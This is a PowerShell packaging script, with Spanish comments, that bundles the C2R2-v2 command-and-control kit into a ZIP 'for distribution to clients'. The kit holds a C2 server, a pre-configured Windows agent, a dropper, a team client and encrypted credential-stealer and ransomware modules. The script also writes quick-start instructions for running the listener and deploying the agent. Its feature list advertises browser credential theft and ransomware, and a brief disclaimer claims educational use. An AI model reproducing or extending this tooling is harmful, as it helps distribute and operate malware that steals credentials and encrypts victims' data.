<#
.SYNOPSIS
    Package C2R2-v2 for distribution to clients
.DESCRIPTION
    Creates a ZIP package with all necessary binaries and tools
.PARAMETER ServerIP
    Default server IP for pre-configured agents
.PARAMETER ServerPort
    Default server port
.PARAMETER OutputName
    Name of the output ZIP file
#>

param(
    [Parameter(Mandatory=$false)]
    [string]$ServerIP = "127.0.0.1",
    
    [Parameter(Mandatory=$false)]
    [int]$ServerPort = 4444,
    
    [Parameter(Mandatory=$false)]
    [string]$OutputName = "C2R2-v2-release"
)

function Write-Color {
    param([string]$Text, [string]$Color = "White")
    $colors = @{
        "Red" = [ConsoleColor]::Red
        "Green" = [ConsoleColor]::Green
        "Yellow" = [ConsoleColor]::Yellow
        "Blue" = [ConsoleColor]::Blue
        "Cyan" = [ConsoleColor]::Cyan
        "Magenta" = [ConsoleColor]::Magenta
        "White" = [ConsoleColor]::White
    }
    Write-Host $Text -ForegroundColor $colors[$Color]
}

Write-Color "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" Blue
Write-Color "   📦 C2R2-v2 Release Packager" Cyan
Write-Color "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" Blue
Write-Color ""

# 1. Compilar todo con build-all.ps1
Write-Color "🔨 Paso 1: Compilando todos los componentes..." Yellow
Write-Color ""

& .\build-all.ps1 -ServerIP $ServerIP -ServerPort $ServerPort -Production

if ($LASTEXITCODE -ne 0) {
    Write-Color "❌ Error durante la compilación" Red
    exit 1
}

Write-Color ""
Write-Color "✓ Compilación completada" Green
Write-Color ""

# 2. Crear estructura de directorios para el release
Write-Color "📁 Paso 2: Creando estructura de directorios..." Yellow

$releaseDir = "release-package"
$timestamp = Get-Date -Format "yyyy.MM.dd"
$version = "v$timestamp"

if (Test-Path $releaseDir) {
    Remove-Item -Recurse -Force $releaseDir
}

# Crear estructura
$dirs = @(
    "$releaseDir",
    "$releaseDir/server",
    "$releaseDir/agent",
    "$releaseDir/builder",
    "$releaseDir/modules",
    "$releaseDir/team-client",
    "$releaseDir/dropper",
    "$releaseDir/docs"
)

foreach ($dir in $dirs) {
    New-Item -ItemType Directory -Path $dir -Force | Out-Null
}

Write-Color "✓ Estructura creada" Green
Write-Color ""

# 3. Copiar binarios
Write-Color "📋 Paso 3: Copiando binarios..." Yellow

# Server binaries
Copy-Item "dist/c2r2-server-x86_64" "$releaseDir/server/" -ErrorAction Stop
Copy-Item "dist/c2r2-server-arm64" "$releaseDir/server/" -ErrorAction Stop
Write-Color "  ✓ Servidores copiados (x86_64 + ARM64)" Cyan

# Pre-compiled agent
Copy-Item "dist/agent.exe" "$releaseDir/agent/" -ErrorAction Stop
Write-Color "  ✓ Agente Windows pre-compilado copiado" Cyan

# Builder binaries (standalone, no source needed)
Copy-Item "builder/builder.exe" "$releaseDir/builder/" -ErrorAction Stop
Copy-Item "builder/builder-linux-x86_64" "$releaseDir/builder/" -ErrorAction Stop
Copy-Item "builder/builder-linux-arm64" "$releaseDir/builder/" -ErrorAction Stop
Write-Color "  ✓ Builders copiados (Windows + Linux x86_64 + ARM64)" Cyan

# Encrypted modules
Copy-Item "modules/stealer.enc" "$releaseDir/modules/" -ErrorAction Stop
Copy-Item "modules/stealer.key" "$releaseDir/modules/" -ErrorAction Stop
Copy-Item "modules/ransomware.enc" "$releaseDir/modules/" -ErrorAction Stop
Copy-Item "modules/ransomware.key" "$releaseDir/modules/" -ErrorAction Stop
Write-Color "  ✓ Módulos encriptados copiados" Cyan

# Team client
Copy-Item "team-client/c2r2_team_client.py" "$releaseDir/team-client/" -ErrorAction Stop
if (Test-Path "team-client/c2r2_team_client.exe") {
    Copy-Item "team-client/c2r2_team_client.exe" "$releaseDir/team-client/" -ErrorAction Stop
}
Write-Color "  ✓ Team client copiado" Cyan

# Dropper
if (Test-Path "dropper/dropper.exe") {
    Copy-Item "dropper/dropper.exe" "$releaseDir/dropper/" -ErrorAction Stop
}
if (Test-Path "dropper/scripts") {
    Copy-Item -Recurse "dropper/scripts" "$releaseDir/dropper/" -ErrorAction Stop
}
Write-Color "  ✓ Dropper copiado" Cyan

# 4. Copiar documentación
Write-Color ""
Write-Color "📚 Paso 4: Copiando documentación..." Yellow

Copy-Item "README.md" "$releaseDir/" -ErrorAction Stop
Copy-Item "LICENSE" "$releaseDir/" -ErrorAction Stop

# Crear documentos específicos
@"
# C2R2-v2 Release $version

## 📦 Contenido del Paquete

\`\`\`
C2R2-v2/
├── server/
│   ├── c2r2-server-x86_64       # Servidor Linux x86_64
│   └── c2r2-server-arm64        # Servidor Linux ARM64 (Raspberry Pi)
├── agent/
│   └── agent.exe                # Agente Windows pre-compilado
├── builder/
│   ├── builder.exe              # Builder Windows
│   ├── builder-linux-x86_64    # Builder Linux x86_64
│   └── builder-linux-arm64     # Builder Linux ARM64
├── modules/
│   ├── stealer.enc              # Módulo stealer encriptado
│   ├── stealer.key              # Clave del stealer
│   ├── ransomware.enc           # Módulo ransomware encriptado
│   └── ransomware.key           # Clave del ransomware
├── team-client/
│   └── c2r2_team_client.py     # Cliente de administración
├── dropper/
│   └── scripts/                 # Scripts de dropper
└── docs/
    └── QUICKSTART.md            # Guía de inicio rápido
\`\`\`

## 🚀 Inicio Rápido

### 1. Servidor C2

**Linux x86_64:**
\`\`\`bash
chmod +x server/c2r2-server-x86_64
./server/c2r2-server-x86_64 --bind 0.0.0.0 --port 4444
\`\`\`

**Raspberry Pi (ARM64):**
\`\`\`bash
chmod +x server/c2r2-server-arm64
./server/c2r2-server-arm64 --bind 0.0.0.0 --port 4444
\`\`\`

### 2. Ejecutar Agente

**Agente pre-configurado:**
\`\`\`
agent\agent.exe
\`\`\`

**Configurado para:** $ServerIP`:$ServerPort

### 3. Team Client

**Python:**
\`\`\`bash
python team-client/c2r2_team_client.py
\`\`\`

Conectar vía SSH tunnel:
\`\`\`bash
ssh -L 8080:localhost:8080 user@c2-server
\`\`\`

## 🔧 Generar Nuevos Agentes

**IMPORTANTE:** El builder incluido NO puede compilar agentes porque no incluye el código fuente de Rust.

**Opciones para generar agentes con diferente IP:**

### Opción 1: Editar config.rs y recompilar (requiere Rust)

Si tienes el código fuente completo y Rust instalado:
\`\`\`bash
# Editar agent/src/config.rs
# Cambiar SERVER_ADDRESS = "tu_ip:puerto"
# Compilar:
cargo build --release --target x86_64-pc-windows-gnu --package agent
\`\`\`

### Opción 2: Usar un agente polimórfico (futuro)

En futuras versiones, el builder incluirá la capacidad de modificar el binario sin recompilar.

### Opción 3: Solicitar agente personalizado

Contacta con el equipo de desarrollo para obtener un agente compilado con tu IP/puerto específicos.

## 📊 Características

- ✅ Servidor multiplataforma (Linux x86_64 + ARM64)
- ✅ Agente Windows ligero (~60KB)
- ✅ Módulos on-demand (Stealer, Ransomware)
- ✅ TLS 1.3 encryption
- ✅ Team client para múltiples operadores
- ✅ File explorer integrado
- ✅ Credential stealing (Chrome, Firefox, Edge)
- ✅ Ransomware con exclusiones configurables

## ⚠️ Disclaimer Legal

Este software es para uso educativo y en entornos autorizados únicamente.
El uso no autorizado es ilegal. Los autores no se hacen responsables del mal uso.

## 📞 Soporte

- GitHub: https://github.com/G4sp4rCS/C2R2-v2
- Documentación: Ver README.md completo

---
Compilado: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
Servidor pre-configurado: $ServerIP`:$ServerPort
"@ | Out-File "$releaseDir/docs/QUICKSTART.md" -Encoding UTF8

Write-Color "✓ Documentación copiada" Green
Write-Color ""

# 5. Crear archivo BUILD_INFO.txt
@"
C2R2-v2 Release Build Information
==================================

Build Date: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
Version: $version

Pre-configured Server: $ServerIP`:$ServerPort

Components:
-----------
✓ C2 Server (Linux x86_64)
✓ C2 Server (Linux ARM64 - Raspberry Pi)
✓ Windows Agent (pre-compiled)
✓ Builder Tools (Windows + Linux)
✓ Encrypted Modules (Stealer + Ransomware)
✓ Team Client (Python)
✓ Dropper Scripts

Notes:
------
- Agent is pre-compiled for Windows x86_64
- To change server IP/port, you need the full source code with Rust toolchain
- All modules are XOR encrypted
- TLS 1.3 enabled by default

Usage:
------
1. Run server: ./server/c2r2-server-x86_64 --bind 0.0.0.0 --port 4444
2. Execute agent: agent\agent.exe
3. Connect team client via SSH tunnel

For full documentation, see README.md and docs/QUICKSTART.md
"@ | Out-File "$releaseDir/BUILD_INFO.txt" -Encoding UTF8

# 6. Crear ZIP
Write-Color "📦 Paso 5: Creando archivo ZIP..." Yellow

$zipName = "$OutputName-$version.zip"
if (Test-Path $zipName) {
    Remove-Item $zipName -Force
}

Compress-Archive -Path "$releaseDir/*" -DestinationPath $zipName -CompressionLevel Optimal

if (Test-Path $zipName) {
    $zipSize = (Get-Item $zipName).Length / 1MB
    Write-Color "✓ ZIP creado: $zipName ($([math]::Round($zipSize, 2)) MB)" Green
} else {
    Write-Color "❌ Error creando ZIP" Red
    exit 1
}

# 7. Limpiar
Write-Color ""
Write-Color "🧹 Paso 6: Limpiando archivos temporales..." Yellow
Remove-Item -Recurse -Force $releaseDir
Write-Color "✓ Limpieza completada" Green

# Resumen
Write-Color ""
Write-Color "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" Blue
Write-Color "✅ Package Release Completado" Green
Write-Color "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" Blue
Write-Color ""
Write-Color "📦 Archivo: $zipName" Cyan
Write-Color "📊 Tamaño: $([math]::Round($zipSize, 2)) MB" Cyan
Write-Color "🌐 Servidor pre-configurado: $ServerIP`:$ServerPort" Cyan
Write-Color ""
Write-Color "📋 Contenido del paquete:" Yellow
Write-Color "   • Servidor C2 (Linux x86_64 + ARM64)" White
Write-Color "   • Agente Windows (pre-compilado con IP configurada)" White
Write-Color "   • Builder tools (Windows + Linux)" White
Write-Color "   • Módulos encriptados (Stealer + Ransomware)" White
Write-Color "   • Team client (Python)" White
Write-Color "   • Documentación completa" White
Write-Color ""
Write-Color "⚠️  Nota importante:" Yellow
Write-Color "   El agente está pre-compilado con la IP $ServerIP" White
Write-Color "   Para cambiar la IP, se necesita el código fuente completo y Rust" White
Write-Color ""
